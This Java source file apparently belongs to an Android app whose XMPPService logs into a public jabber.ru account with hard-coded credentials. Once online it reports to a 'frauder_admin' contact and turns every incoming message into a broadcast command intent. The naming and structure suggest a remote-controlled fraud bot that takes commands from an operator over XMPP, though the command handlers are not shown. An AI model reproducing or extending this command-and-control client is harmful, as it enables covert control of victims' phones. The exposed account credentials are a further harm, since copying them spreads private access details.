package com.heatclub.moro.xmpp;

import java.lang.reflect.Method;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import org.jivesoftware.smack.ConnectionListener;
import org.jivesoftware.smack.PacketListener;
import org.jivesoftware.smack.packet.Packet;
import org.jivesoftware.smack.packet.Message;
import org.jivesoftware.smack.XMPPConnection;
import com.heatclub.moro.cmd.*;

public class XMPPService extends Service {

	private XMPPProvider xp;
	private final static String ACTION_TYPE = "com.heatclub.moro.INPUT_MESSAGE";
	private static String username = "frauder_cl1";
	private static String password = "mainkey7";
	
	private static String domain = "jabber.ru";
	private static int port = 5222;
	private static String server = "jabber.ru";
	
	private static final String TAG = "moro";
	private CommandGenerator cmd;
	
	@Override
	public IBinder onBind(final Intent intent) {
		return new LocalBinder<XMPPService>(this);
	}

	@Override
	public void onCreate() {		
		super.onCreate();		
		cmd = new CommandGenerator();		
		xp = new XMPPProvider(domain, port, server);		
		xp.setListener(new stateListener());
	}
	
	
	@Override
	public int onStartCommand(final Intent intent, final int flags, final int startId) {
		cmd.setCommandIntent(intent);
		String command = cmd.getCommandName();
		if(command.equals("start"))
			xp.connect(username, password);	
		else
		if(command.equals("stop"))
			this.stopSelf();

		return Service.START_NOT_STICKY;
	}

	@Override
	public boolean onUnbind(final Intent intent) {
		return super.onUnbind(intent);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		xp.disconnect();
	}

	public static String getThreadSignature() {
		final Thread t = Thread.currentThread();
		return new StringBuilder(t.getName()).append("[id=").append(t.getId()).append(", priority=")
				.append(t.getPriority()).append("]").toString();
	}
	
	private void processCommand(){
		try{
		Class c = this.getClass(); 
		Class[] paramTypes = new Class[] { String.class, int.class }; 
		Method method = c.getMethod("getCalculateRating", paramTypes); 
		Object[] args = new Object[] { new String("First Calculate"), new Integer(10) }; 
		Double d = (Double) method.invoke(this, args); 	
		}
		catch(Exception e){
			
		}
	/*
		Class c =this.getClass();	
		Method[] methods = c.getMethods(); 
		for (Method method : methods) { 
			System.out.println("Имя: " + method.getName()); 
			System.out.println("Возвращаемый тип: " + method.getReturnType().getName()); 
			Class[] paramTypes = method.getParameterTypes(); 
			System.out.print("Типы параметров: "); 
			for (Class paramType : paramTypes) { 
				System.out.print(" " + paramType.getName()); 
			} 
			System.out.println(); 
		} 
*/	}

	class stateListener extends XMPPStateListener{
		
		@Override
		public void authenticated(XMPPConnection p1)
		{
			xp.sendMessage(username+" в сети", "frauder_admin@jabber.ru");	
			
		}
		
		@Override
		public void processPacket(Packet packet) 
		{
			if (packet instanceof Message) 
			{
				Message message = (Message) packet;
				if(message.getBody() != null){
					try{
				//		Log.d(TAG, "command: "+CommandGenerator.getDefault(message));
						CommandGenerator cmd = new CommandGenerator();
					//	cmd.createCommandIntent(message);
						sendBroadcast(cmd.getCommandIntent(message));
			
					//	String msg = "command: "+"\n"+cmd.getAuthor()+"\n"+cmd.getFrom()+"\n"+cmd.getTo()+"\n"+cmd.getCommand()+"\n"+cmd.getArgs(1);
					//	msg = "command: " + msg;// + "' on thread: " + getThreadSignature();
					//	xp.sendMessage(msg, message.getFrom());
					}
					catch(Exception e){

					}
				}	
			}
		}
	}		
	
}
